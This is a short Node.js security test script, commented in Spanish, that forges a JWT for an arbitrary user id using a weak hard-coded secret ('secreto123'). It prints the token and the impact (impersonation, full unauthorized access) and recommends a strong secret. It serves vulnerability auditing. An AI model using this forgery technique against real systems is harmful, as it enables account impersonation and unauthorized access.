/**
 * Script de Prueba: Verificación de JWT Secret Débil
 * Demuestra que con el secret conocido se pueden generar tokens falsos
 */

const jwt = require('jsonwebtoken');

// El secret débil del archivo .env
const WEAK_SECRET = 'secreto123';

console.log('='.repeat(60));
console.log('PRUEBA 1: Generación de Token Falso con Secret Débil');
console.log('='.repeat(60));
console.log();

// Generar token para un usuario falso
const fakeUserId = '507f1f77bcf86cd799439011';
const fakeToken = jwt.sign(
  { id: fakeUserId },
  WEAK_SECRET,
  { expiresIn: '1h' }
);

console.log('❌ VULNERABILIDAD DETECTADA:');
console.log('   El JWT_SECRET es predecible ("secreto123")');
console.log();
console.log('📝 Token falso generado exitosamente para userId:', fakeUserId);
console.log();
console.log('🔑 Token:');
console.log(fakeToken);
console.log();
console.log('📊 Payload decodificado:');
const decoded = jwt.decode(fakeToken);
console.log(JSON.stringify(decoded, null, 2));
console.log();
console.log('⚠️  IMPACTO:');
console.log('   - Cualquiera puede generar tokens válidos');
console.log('   - Suplantación de identidad de cualquier usuario');
console.log('   - Acceso no autorizado completo al sistema');
console.log();
console.log('✅ SOLUCIÓN:');
console.log('   Generar secret fuerte: openssl rand -base64 64');
console.log('='.repeat(60));
